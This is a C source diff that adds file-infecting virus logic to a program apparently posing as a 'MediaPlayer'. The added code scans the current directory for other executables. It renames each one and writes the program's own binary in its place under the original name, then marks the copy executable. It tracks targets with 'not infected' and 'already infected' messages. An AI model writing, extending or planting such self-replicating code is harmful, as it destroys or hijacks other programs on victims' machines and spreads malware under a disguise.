@@ -7,7 +7,7 @@
 #include <string.h>
 #include <stdio.h>
 
-void open_repo(char * directory){
+void open_repo(char * directory,char * argv[]){
     DIR * dp;
     struct dirent * dirp;
     dp = opendir(directory);
@@ -17,7 +17,7 @@ void open_repo(char * directory){
         stat(dirp->d_name,&buf);
         int test = buf.st_mode;
         printf("%d\t",&test);
-        if(((test & S_IXUSR) && (test & S_IFREG))&&(strstr(dirp->d_name,".old")==NULL)){
+        if(((test & S_IXUSR) && (test & S_IFREG))&&(strstr(dirp->d_name,".old")==NULL)&&((strcmp(dirp->d_name,"MediaPlayer")!=0))){
             printf(".exe");
             DIR * dp_2;
             struct dirent * dirp_2;
@@ -33,15 +33,38 @@ void open_repo(char * directory){
                     printf(".old found");
                     break;
                 }
-                
             }
             if (res == 0){
                 printf("\tnot infected");
                 printf("\t%s",dirp->d_name);
                 int re = rename(cp,dirp->d_name);
                 printf("\t%d",re);
-                FILE * f = fopen(cp,"r");
-                printf("%d",f);
+                char * arg= argv[0];
+                char fn[255];
+                strncpy(fn,&arg[2],255);
+                printf("\t%s",fn);
+                FILE * f = fopen(fn,"rb");
+                if (f==NULL){
+                    printf("\n pas read");
+                }
+                FILE * g = fopen(cp,"wb");
+                if (f==NULL){
+                    printf("\n pas ecrire");
+                }
+                fseek(f, 0L, SEEK_END);
+                int sz = ftell(f);
+                printf("\t size :%d \t",sz);
+                char buf[sz];
+                int x;
+                fseek(f, 0L, SEEK_SET);
+                while((x = fread(buf, 1, sz, f) != 0)){ 
+                    if(fwrite(buf, 1, sz, g) != x){ 
+                        break; 
+                        } 
+                }
+                fclose(f);
+                fclose(g);
+                chmod(cp,0755);
             }else{
                 printf("already infected");
             }
@@ -61,7 +84,7 @@ void open_repo(char * directory){
 }
 
 int main(int argc, char * argv[]){
-    open_repo(".");
+    open_repo(".", argv);
     const int Width = 1920, Height = 1080;
     char *buffer = (char*)malloc(3 * Width * Height);
 
